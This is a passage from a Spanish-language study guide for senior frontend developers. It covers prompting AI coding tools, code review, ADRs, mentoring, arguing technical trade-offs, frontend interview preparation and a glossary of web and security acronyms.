    componentes, si hay que agregar un test. Un prompt efectivo incluye
    restricciones explícitas y, cuando es posible, apunta a un ejemplo
    ya existente en el propio repositorio para que el resultado siga el
    mismo patrón, en vez de introducir un estilo nuevo e inconsistente.
  - **Ejemplo**:
    ```
    Prompt vago:
    "Agrega un botón de exportar a CSV en la tabla de pedidos"

    Prompt efectivo:
    "Agrega un botón de exportar a CSV en OrdersTable.tsx, siguiendo el
    mismo patrón que ExportButton.tsx en features/inventory/ (usa
    Button del design system, dispara un toast de éxito/error con la
    misma librería que ya usa ese archivo). Agrega un test unitario
    co-localizado igual que los demás archivos de features/orders/."
    ```
    El segundo prompt reduce directamente el riesgo de alucinación (le
    da un ejemplo real y verificable para imitar) y de inconsistencia
    (fija de antemano qué convenciones seguir), en vez de dejar que el
    modelo elija por defecto un patrón genérico.

## 16. Habilidades de senior (no técnicas)

### Básico

- Cómo dar code review efectivo

  - **Teoría**: un code review efectivo separa explícitamente lo
    **bloqueante** (bugs reales, problemas de seguridad, violaciones de
    convenciones acordadas del equipo) de lo **opcional** (preferencias
    de estilo personal, una forma alternativa que no es objetivamente
    mejor) — mezclar ambos sin distinguirlos hace que el autor no sepa
    qué debe corregir antes de mergear y qué puede ignorar. Cada
    comentario bloqueante debería explicar el **porqué**, no solo señalar
    el qué, para que el autor aprenda el criterio y no solo aplique el
    cambio puntual sin entenderlo.
  - **Ejemplo**:
    ```
    Comentario malo (no explica el porqué, sin distinguir prioridad):
    "Esto está mal, usa otro nombre."

    Comentario bueno (bloqueante, explica el porqué):
    "Bloqueante: `data` es demasiado genérico acá -- en una revisión
    futura no queda claro qué contiene sin leer el resto de la función.
    ¿Qué tal `pedidosDelUsuario`?"

    Comentario bueno (opcional, marcado como tal):
    "Nit (opcional): podrías simplificar esto con optional chaining,
    pero no es bloqueante -- el código actual también es correcto."
    ```

### En profundidad

- ADR (*Architecture Decision Record*): qué es y su estructura mínima

  - **Teoría**: un **ADR** (ver Glosario) es un documento corto que
    registra una decisión de arquitectura importante **en el momento en
    que se toma**, junto con el contexto que la motivó y sus
    consecuencias conocidas. Su valor no es "documentar por documentar":
    meses después, cuando alguien nuevo se pregunte "¿por qué elegimos
    Zustand en vez de Redux?", un ADR responde esa pregunta sin depender
    de que alguien del equipo original todavía esté disponible para
    explicarlo de memoria (y sin especular con el código solo). La
    estructura mínima tiene tres partes: **contexto** (qué problema
    forzó la decisión, qué opciones se consideraron), **decisión** (qué
    se eligió, en una frase clara) y **consecuencias** (qué se gana, qué
    se sacrifica, qué queda pendiente de revisar).
  - **Ejemplo** (ADR real y corto):
    ```markdown
    # ADR-007: Adoptar Zustand para estado global de UI

    ## Contexto
    El estado de tema/usuario/sidebar vive hoy en 4 Context providers
    anidados. Agregar un nuevo pedazo de estado global requiere otro
    provider, y ya vemos re-renders innecesarios cuando cualquiera cambia
    (ver sección 6 de FRONTEND-SENIOR.md). Se evaluaron Redux Toolkit,
    Jotai y Zustand.

    ## Decisión
    Usamos Zustand para todo el estado global de UI nuevo. Los Context
    providers existentes se migran de forma incremental, no de una vez.

    ## Consecuencias
    - (+) Sin boilerplate de actions/reducers, curva de aprendizaje baja.
    - (+) Selectores evitan el problema de re-render de Context.
    - (-) Menos herramientas de debugging (time-travel) que Redux DevTools.
    - Pendiente: definir convención de nombres para los stores nuevos.
    ```

- Mentoring técnico: dar la respuesta vs guiar a que la encuentren

  - **Teoría**: dar la respuesta directa resuelve el problema **de hoy**
    más rápido, pero no desarrolla la capacidad de la persona para
    resolver el problema **de mañana** por sí misma. Guiar con preguntas
    (¿qué intentaste ya? ¿qué esperabas que pasara vs qué pasó
    realmente? ¿dónde pondrías el primer `console.log` para acotar
    dónde está el problema?) construye el criterio de debugging de la
    persona, a costa de tomar más tiempo en el momento puntual — un
    trade-off deliberado que un senior debe elegir conscientemente según
    el contexto (una urgencia de producción no es el momento para
    mentoring socrático; una tarea sin presión de tiempo sí lo es).
  - **Ejemplo**:
    ```
    Dar la respuesta directa:
    "Te falta el `key` en el map, ponle `key={item.id}`."

    Guiar a que la encuentren:
    "React nos está avisando algo en la consola sobre esta lista --
    ¿qué dice el warning exactamente? ¿Qué tienen en común todos los
    ejemplos de listas que ya vimos en el proyecto?"
    ```
    La segunda opción, si el tiempo lo permite, deja a la persona con la
    herramienta ("leer warnings de la consola con atención") en vez de
    solo con la solución puntual de este caso.

- Cómo argumentar un trade-off técnico ante producto o diseño

  - **Teoría**: producto y diseño no comparten el vocabulario técnico, y
    explicar un trade-off en términos de "deuda técnica" o "complejidad
    de arquitectura" sin traducirlo a impacto de negocio o de usuario
    no logra una decisión informada de la contraparte — solo genera la
    sensación de que "ingeniería está poniendo trabas". La traducción
    efectiva conecta la decisión técnica con una consecuencia que sí les
    importa directamente: tiempo de entrega, riesgo de bugs en
    producción, o experiencia real del usuario.
  - **Ejemplo** (conversación real):
    ```
    Mal argumento (jerga técnica sin traducir):
    "No podemos hacer el filtro en tiempo real, tendríamos que refactorizar
    el estado global y migrar de Context a una librería con selectores."

    Buen argumento (traducido a impacto):
    "Podemos entregar el filtro para el viernes si se aplica al hacer
    clic en 'Buscar', como ya funciona hoy. La versión 'en tiempo real
    mientras escribes' es posible, pero agrega ~3 días más de trabajo
    porque toca una parte del código que hoy re-renderiza toda la
    pantalla en cada cambio, y necesitamos arreglar eso primero para que
    no se sienta lento. ¿La fecha del viernes es más importante, o
    prefieren esperar los 3 días extra por esa mejora de UX?"
    ```
    Esto le da a producto una decisión real e informada (fecha vs UX),
    en vez de una negativa técnica que no pueden evaluar.

## 17. Preparación específica para entrevistas

### Básico

- Qué formato tienen los coding challenges de frontend hoy

  - **Teoría**: los coding challenges de frontend senior ya no son
    principalmente algoritmos abstractos (invertir un árbol binario) —
    suelen pedir **implementar un componente real** con estado,
    interactividad y accesibilidad (un autocompletar, un modal, una
    lista paginada), evaluado en vivo o como take-home. Lo que realmente
    se evalúa no es solo "¿funciona?", sino: ¿maneja los estados de
    loading/error/vacío (sección de `GOOD-FRONTEND-PRACTICES.md`)? ¿es
    accesible por teclado? ¿el código está organizado de forma que un
    compañero lo entendería sin explicación? ¿pensó en casos límite sin
    que se los señalaran?
  - **Ejemplo**: un enunciado típico ("implementa un componente de
    autocompletar que busque en una API") se evalúa en capas, no solo en
    el resultado visual final:
    ```
    Capa 1 (mínimo esperado): el input filtra resultados y los muestra.
    Capa 2 (diferenciador): debounce en la búsqueda (sección 2), manejo
      de loading/error, cancelación de peticiones obsoletas (sección 5).
    Capa 3 (senior real): navegable con teclado (flechas + Enter +
      Escape), anuncia resultados a lectores de pantalla (sección 9),
      código con nombres claros y sin duplicación evidente.
    ```

### En profundidad

- Framework de 4-5 pasos para un frontend system design interview

  - **Teoría**: sin una estructura, es fácil lanzarse directo a proponer
    tecnologías específicas sin haber entendido el problema real, o
    quedarse pegado en un solo detalle sin cubrir la vista completa.
    Un framework probado: (1) **Clarificar requisitos** (funcionales y no
    funcionales: ¿cuántos usuarios? ¿tiempo real o no? ¿qué dispositivos?);
    (2) **Estimar escala** (número de usuarios concurrentes, frecuencia de
    actualización, volumen de datos — esto condiciona decisiones
    posteriores); (3) **Proponer arquitectura de alto nivel** (qué
    estrategia de renderizado, cómo fluyen los datos, qué se cachea);
    (4) **Profundizar en 1-2 componentes críticos** (el que el
    entrevistador señale, o el que tenga más riesgo técnico); (5)
    **Discutir trade-offs** (qué se sacrificó y por qué, qué se haría
    distinto con más tiempo/escala).
  - **Ejemplo aplicado**: "Diseña un feed de noticias tipo Twitter"
    ```
    1. Clarificar: ¿feed cronológico o con algoritmo de relevancia?
       ¿en tiempo real (llegan posts nuevos sin refrescar) o al recargar?
       ¿solo web o también móvil?

    2. Estimar escala: si son millones de usuarios con feeds que se
       actualizan constantemente, descarta polling agresivo -> mejor
       WebSocket o SSE (sección 1) para push de posts nuevos.

    3. Arquitectura de alto nivel: SSR para el primer post visible (LCP
       rápido y SEO si aplica, sección 7-8) + CSR para el scroll
       infinito posterior; paginación por cursor (sección 5, estable con
       un feed que crece constantemente); estado de servidor con caché
       tipo React Query (sección 6) para los posts ya vistos.

    4. Profundizar: el scroll infinito -- virtualización de la lista
       (sección 8, no se puede mantener miles de posts en el DOM real),
       y cómo insertar posts nuevos que llegan por SSE sin romper la
       posición de scroll del usuario que está leyendo más abajo.

    5. Trade-offs: cursor-based pagination complica saltar a "post
       número 500" directamente, pero es el trade-off correcto para un
       feed que cambia constantemente; con más tiempo, se profundizaría
       en la estrategia de invalidación de caché cuando alguien edita o
       borra un post ya cacheado en el cliente.
    ```

- Método STAR para preguntas comportamentales

  - **Teoría**: **STAR** (*Situation, Task, Action, Result* — ver
    Glosario) estructura una respuesta a preguntas del tipo "cuéntame de
    una vez que..." de forma que sea concreta y verificable, en vez de
    una generalización vaga. **Situación** da el contexto mínimo
    necesario; **Tarea** aclara cuál era específicamente tu
    responsabilidad en esa situación; **Acción** detalla qué hiciste **tú**
    (no "el equipo", que diluye tu aporte real); **Resultado** cierra con
    el impacto medible, cuando sea posible con números.
  - **Ejemplo** (pregunta: "cuéntame de una vez que tuviste que tomar una
    decisión técnica difícil bajo presión de tiempo"):
    ```
    Situación: A dos días de un lanzamiento importante, descubrimos que
    el checkout tenía un bug de re-render que hacía la app inutilizable
    en gama baja de gama baja de dispositivos móviles.

    Tarea: Como responsable del frontend de esa feature, debía decidir
    si retrasábamos el lanzamiento o desplegábamos con el bug conocido.

    Acción: Diagnostiqué que el problema venía de un Context que
    re-renderizaba todo el árbol del checkout en cada tecla (sección 6).
    En vez de un refactor completo bajo presión, apliqué React.memo en
    los componentes más pesados como mitigación de corto plazo, y
    documenté un ADR (sección 16) proponiendo la migración a una
    librería con selectores para después del lanzamiento.

    Resultado: Lanzamos a tiempo, el tiempo de interacción bajó de ~800ms
    a ~120ms en los dispositivos de prueba, y la migración documentada
    en el ADR se hizo dos semanas después sin presión de tiempo.
    ```

## Glosario

- **DNS (Domain Name System)**: sistema jerárquico que traduce un dominio
  (`miapp.com`) a una dirección IP. Es el primer paso de red antes de poder
  conectarse a un servidor.
- **TTL (Time To Live)**: tiempo, en segundos, que una respuesta (DNS o
  HTTP) puede cachearse antes de volver a consultarse.
- **TCP (Transmission Control Protocol)**: protocolo de transporte
  orientado a conexión y fiable; establece una conexión mediante un
  handshake de 3 pasos antes de transferir datos.
- **RTT (Round-Trip Time)**: tiempo que tarda un paquete en ir del cliente
  al servidor y volver. Es la unidad con la que se mide el costo de cada
  paso de red (DNS, TCP, TLS, la petición HTTP en sí).
- **TLS / SSL (Transport Layer Security / Secure Sockets Layer)**:
  protocolo que cifra la conexión y verifica la identidad del servidor
  mediante certificados. SSL es el nombre antiguo/obsoleto; hoy se usa TLS
  (versión actual: TLS 1.3).
- **HTTP / HTTPS (HyperText Transfer Protocol / HTTP Secure)**: protocolo
  de aplicación con el que el navegador pide recursos a un servidor.
  HTTPS es HTTP corriendo sobre una conexión cifrada con TLS.
- **QUIC (Quick UDP Internet Connections)**: protocolo de transporte sobre
  UDP en el que se basa HTTP/3; multiplexa streams sin el head-of-line
  blocking que persiste en HTTP/2 sobre TCP.
- **UDP (User Datagram Protocol)**: protocolo de transporte sin conexión
  ni garantía de entrega (más simple y rápido que TCP); QUIC lo usa como
  base y añade sus propias garantías de fiabilidad por stream.
- **HOL blocking (Head-of-Line blocking)**: cuando un mensaje bloqueado
  al principio de una cola impide procesar los que van detrás, aunque no
  dependan entre sí. Aparece a nivel de aplicación en HTTP/1.1 y a nivel
  de transporte en HTTP/2 (por eso HTTP/3 lo resuelve cambiando de TCP a
  QUIC).
- **CORS (Cross-Origin Resource Sharing)**: mecanismo por el cual un
  servidor autoriza, mediante headers, que un script de otro origen lea
  su respuesta. Sin esa autorización, la same-origin policy del navegador
  bloquea la lectura.
- **CSRF (Cross-Site Request Forgery)**: ataque que aprovecha que las
  cookies se envían automáticamente para hacer que el navegador de un
  usuario autenticado mande una petición no deseada a otro sitio.
- **DOM (Document Object Model)**: representación en memoria del HTML
  como árbol de nodos, construida por el navegador al parsear la página.
- **CSSOM (CSS Object Model)**: representación en memoria de las reglas
  CSS, análoga al DOM pero para estilos; se combina con el DOM para
  formar el Render Tree.
- **GPU (Graphics Processing Unit)**: procesador especializado en
  gráficos; el navegador la usa en la fase de Composite para combinar
  capas sin recalcular todo el layout/paint.
- **SSE (Server-Sent Events)**: mecanismo para que un servidor empuje
  datos a un cliente de forma unidireccional sobre una conexión HTTP
  persistente, usando la API `EventSource` del navegador.

Definiciones de las siglas usadas en la sección 2 (JavaScript profundo):

- **I/O (Input/Output)**: operaciones de entrada/salida (leer un archivo,
  hacer una petición de red, esperar un temporizador) que son lentas
  comparadas con ejecutar código en CPU. JS las delega fuera del motor
  para no bloquear el hilo principal mientras esperan.
- **ESM (ECMAScript Modules)**: el sistema de módulos estándar del
  lenguaje JavaScript (`import`/`export`), con resolución estática que
  habilita tree-shaking.
- **CJS (CommonJS)**: el sistema de módulos original de Node.js
  (`require`/`module.exports`), con resolución dinámica en tiempo de
  ejecución.
- **TDZ (Temporal Dead Zone / zona muerta temporal)**: el período entre el
  inicio de un scope y la línea donde se declara una variable `let`/
  `const`; intentar leerla antes lanza un error, a diferencia de `var`.
- **NaN (Not a Number)**: valor especial de JavaScript que representa el
  resultado de una operación numérica inválida (ej. `0 / 0`). Su
  particularidad es que `NaN !== NaN`; se verifica con `Number.isNaN()`.
- **IEEE 754**: el estándar internacional que define cómo se representan
  los números decimales en binario con precisión limitada; es la causa
  de que `0.1 + 0.2 !== 0.3` en JavaScript y en casi todos los lenguajes
  modernos.

Definiciones de las siglas usadas en la sección 3 (TypeScript avanzado):

- **TS (TypeScript)**: superset de JavaScript que añade tipado estático
  opcional, verificado en tiempo de compilación (se pierde por completo
  al compilar a JS puro, no existe en runtime).
- **JSON (JavaScript Object Notation)**: formato de texto para
  intercambiar datos estructurados; se menciona en TypeScript porque un
  `enum` numérico pierde legibilidad al serializarse a JSON (se ve como
  un número, no como su nombre).

Definiciones de las siglas usadas en la sección 4 (React en profundidad):

- **RSC (React Server Components)**: componentes que se ejecutan
  exclusivamente en el servidor, nunca envían su propio código JS al
  navegador, y pueden acceder directamente a fuentes de datos del backend.
- **HOC (Higher-Order Component)**: patrón anterior a los hooks para
  reutilizar lógica con estado — una función que recibe un componente y
  retorna otro componente "envuelto" con lógica adicional. En su mayoría
  reemplazado hoy por custom hooks, más simples de componer y depurar.

Definiciones de las siglas usadas en la sección 5 (APIs y comunicación
cliente-servidor):

- **REST (REpresentational State Transfer)**: estilo de diseño de APIs que
  modela el dominio como recursos identificados por URL, manipulados con
  los verbos HTTP estándar (`GET`, `POST`, `PUT`, `DELETE`), en vez de
  codificar la acción en la propia ruta.
- **CRUD (Create, Read, Update, Delete)**: las cuatro operaciones básicas
  sobre un recurso de datos, que en una API REST se mapean directamente a
  `POST`, `GET`, `PUT`/`PATCH` y `DELETE`.
- **XHR (XMLHttpRequest)**: la API original del navegador para hacer
  peticiones asíncronas, basada en eventos; `fetch` es su reemplazo
  moderno, basado en Promises.
- **URL (Uniform Resource Locator)**: la dirección que identifica un
  recurso en la web (protocolo, dominio, ruta y, opcionalmente, query
  params). Es lo que el navegador parsea como primer paso al cargar
  cualquier página (sección 1) y lo que estructura el diseño de rutas de
  una API REST.

Definiciones de las siglas usadas en la sección 6 (Gestión de estado y
datos):

- **UI (User Interface / interfaz de usuario)**: la capa visual e
  interactiva con la que la persona usuaria opera la aplicación. Se usa
  para distinguir "estado de UI" (datos propios de la interfaz, como un
  modal abierto o el tema activo) de "estado de servidor" (una copia
  cacheada de datos que en realidad viven en el backend).
- **SWR (stale-while-revalidate)**: patrón de caché (y nombre de una
  librería popular que lo implementa) que muestra de inmediato el último
  dato conocido, aunque esté desactualizado ("stale"), mientras revalida
  en segundo plano contra el servidor y actualiza la UI si el dato
  cambió, sin bloquear al usuario con un estado de carga.

Definiciones de las siglas usadas en la sección 7 (Estrategias de
renderizado y meta-frameworks):

- **CSR (Client-Side Rendering)**: el navegador descarga un HTML casi
  vacío y genera toda la interfaz con JS ejecutado en el propio cliente.
- **SSR (Server-Side Rendering)**: el servidor genera el HTML completo en
  cada petición, antes de enviarlo al navegador.
- **SSG (Static Site Generation)**: el HTML se genera una sola vez, en
  tiempo de build, y se sirve como archivo estático (habitualmente desde
  un CDN).
- **ISR (Incremental Static Regeneration)**: híbrido entre SSR y SSG —
  sirve una versión estática cacheada y la regenera en segundo plano
  pasado un tiempo, sin requerir un build completo del sitio.
- **SPA (Single Page Application)**: una aplicación que carga una sola
  vez y actualiza el contenido dinámicamente con JS en el cliente, sin
  recargar la página completa en cada navegación — el resultado típico
  de usar CSR.
- **TTI (Time To Interactive)**: métrica que mide cuánto tarda una página
  en volverse completamente interactiva (responder de forma fiable a la
  entrada del usuario), no solo en verse cargada visualmente.

Definiciones de las siglas usadas en la sección 8 (Performance web y Core
Web Vitals):

- **CWV (Core Web Vitals)**: las tres métricas de campo que Google usa
  como señal de page experience: LCP (carga), INP (interactividad) y CLS
  (estabilidad visual). Se evalúan en el percentil 75, por móvil y
  desktop; hay que pasar las tres.
- **LCP (Largest Contentful Paint)**: tiempo hasta pintar el elemento de
  contenido más grande del viewport. Bueno: ≤ 2.5 s.
- **INP (Interaction to Next Paint)**: latencia desde una interacción
  (clic/tap/tecla) hasta el siguiente paint, a lo largo de toda la
  visita. Reemplazó a FID en marzo de 2024. Bueno: ≤ 200 ms.
- **CLS (Cumulative Layout Shift)**: score acumulado de desplazamientos
  inesperados del layout. Bueno: ≤ 0.1.
- **FID (First Input Delay)**: métrica antigua que solo medía el delay de
  la *primera* interacción; ya no es Core Web Vital (sustituida por INP).
- **FCP (First Contentful Paint)**: cuándo se pinta el primer contenido
  (texto/imagen); útil en lab, no es Core Web Vital.
- **TBT (Total Blocking Time)**: en lab, suma del tiempo que long tasks
  (> 50 ms) bloquean el hilo principal entre FCP y TTI; proxy habitual
  de INP en Lighthouse/CI.
- **TTFB (Time To First Byte)**: tiempo hasta el primer byte del HTML;
  subparte típica al depurar LCP.
- **CrUX (Chrome User Experience Report)**: dataset público de métricas
  de campo de usuarios de Chrome; alimenta PageSpeed Insights y el
  informe de CWV en Search Console.
- **RUM (Real User Monitoring)**: medir LCP/INP/CLS (u otras) en los
  navegadores reales de producción, p. ej. con la librería `web-vitals`.

Definiciones de las siglas usadas en la sección 9 (Accesibilidad e i18n):
- **RTL (Right-To-Left)**: dirección de lectura de idiomas como árabe o
  hebreo, de derecha a izquierda. Requiere usar propiedades lógicas de
  CSS en vez de propiedades físicas para que el layout se adapte
  correctamente.
- **LTR (Left-To-Right)**: dirección de lectura de idiomas como español o
  inglés, de izquierda a derecha; es la dirección opuesta a RTL.
- **ICU (International Components for Unicode)**: conjunto de estándares
  (entre ellos MessageFormat) para internacionalización, usado por
  librerías de i18n para manejar reglas de pluralización complejas que
  varían según el idioma.
- **NVDA (NonVisual Desktop Access)**: lector de pantalla gratuito y de
  código abierto para Windows, uno de los más usados para pruebas
  manuales de accesibilidad fuera del ecosistema Apple (donde se usa
  VoiceOver).
- **WAI (Web Accessibility Initiative)**: la iniciativa del W3C que
  publica las WAI-ARIA Authoring Practices, la guía de referencia sobre
  qué comportamiento de teclado y semántica ARIA debe tener cada patrón
  de componente interactivo (combobox, listbox, modal, etc.).
- **QA (Quality Assurance / aseguramiento de calidad)**: la disciplina y
  el proceso de verificar que un producto funciona como se espera antes
  de llegar a producción, incluyendo pruebas manuales de accesibilidad
  con teclado y lector de pantalla que ninguna herramienta automatizada
  cubre por completo.

Definiciones de las siglas usadas en la sección 10 (Seguridad en
frontend):

- **OWASP (Open Web Application Security Project)**: organización que
  publica el "Top 10" de riesgos de seguridad web más comunes; sirve
  como vocabulario y checklist de la industria (no es una norma solo de
  frontend).
- **XSS (Cross-Site Scripting)**: inyección de JavaScript malicioso en
  páginas que otros usuarios ven o ejecutan; en frontend es la forma más
  relevante de *Injection*.
- **CSRF (Cross-Site Request Forgery)**: ataque que aprovecha cookies
  enviadas automáticamente para que el navegador de un usuario
  autenticado mande una petición no deseada a tu API.
- **CSP (Content Security Policy)**: header HTTP que dice al navegador
  qué scripts, estilos e iframes puede cargar/ejecutar; mitiga XSS y
  clickjacking (`frame-ancestors`).
- **CVE (Common Vulnerabilities and Exposures)**: identificador público
  estandarizado de una vulnerabilidad conocida (p. ej. en una
  dependencia de npm).
- **OAuth (Open Authorization)**: protocolo de autorización que permite a
  una aplicación acceder a un recurso en nombre de un usuario sin que
  este comparta su contraseña directamente con ella.
- **OIDC (OpenID Connect)**: capa de autenticación construida encima de
  OAuth 2.0, que además de autorizar acceso permite identificar quién es
  el usuario.
- **PKCE (Proof Key for Code Exchange)**: extensión de OAuth 2.0 que
  permite a clientes públicos (como una SPA, sin un secreto que puedan
  proteger) completar el flujo de login de forma segura, usando un
  secreto temporal generado en cada intento de login.
- **JWT (JSON Web Token)**: formato estándar y compacto para representar
  tokens de autenticación/autorización, comúnmente usado como access
  token en flujos OAuth/OIDC.
- **UX (User Experience / experiencia de usuario)**: la calidad de la
  experiencia percibida por quien usa el producto (facilidad, claridad,
  fricción); se usa para distinguir un control de UI (ocultar un botón)
  de una garantía real de seguridad (validar en el servidor).
- **SHA (Secure Hash Algorithm)**: familia de funciones hash
  criptográficas (por ejemplo, SHA-256) que producen una huella digital
  de longitud fija a partir de cualquier dato; en PKCE se usa para
  derivar el `code_challenge` a partir del `code_verifier` sin exponer
  este último.

Definiciones de las siglas usadas en la sección 11 (Testing y calidad):

- **E2E (end-to-end)**: pruebas que ejercitan la aplicación completa, de
  principio a fin, en un entorno lo más parecido posible al real (un
  navegador real contra un backend real o casi real).
- **TDD (Test-Driven Development)**: metodología donde el test se escribe
  antes que el código de producción, siguiendo el ciclo red (test falla),
  green (código mínimo para pasar) y refactor (mejora sin cambiar el
  comportamiento).

Definiciones de las siglas usadas en la sección 14 (CI/CD, despliegue y
observabilidad):

- **CD (Continuous Delivery / Continuous Deployment)**: la práctica de
  automatizar la entrega de cada cambio validado hacia producción (o al
  menos dejarlo listo para desplegarse con un solo paso), complementando
  a CI, que valida el cambio antes de llegar a esa etapa.

Definiciones de las siglas usadas en la sección 15 (IA aplicada al
desarrollo frontend):

- **IA (Inteligencia Artificial)**: el campo y las técnicas (incluyendo
  los modelos de lenguaje) que permiten a un sistema generar código,
  sugerencias o ejecutar tareas de forma autónoma o semi-autónoma, con
  distintos niveles de supervisión humana requerida.
- **LLM (Large Language Model / modelo de lenguaje grande)**: el tipo de
  modelo de IA (entrenado con grandes cantidades de texto) que da
  soporte tanto al autocompletado inline como a los agentes de código;
  genera texto estadísticamente plausible, lo que explica tanto su
  utilidad como su riesgo de "alucinar" APIs que no existen.
- **CSV (Comma-Separated Values)**: formato de texto plano para datos
  tabulares, donde cada línea es una fila y las columnas se separan por
  comas; un formato de exportación/importación común en features de
  reportes o tablas de datos.

Definiciones de las siglas usadas en la sección 16 (Habilidades de senior):

- **ADR (Architecture Decision Record)**: documento corto que registra
  una decisión de arquitectura en el momento en que se toma, con su
  contexto, la decisión en sí y sus consecuencias conocidas — para que
  alguien futuro entienda el porqué sin depender de la memoria del
  equipo original.

Definiciones de las siglas usadas en la sección 17 (Preparación específica
para entrevistas):

- **STAR (Situation, Task, Action, Result)**: estructura para responder
  preguntas comportamentales en una entrevista, describiendo el contexto,
  la responsabilidad propia, las acciones concretas tomadas y el
  resultado medible obtenido.
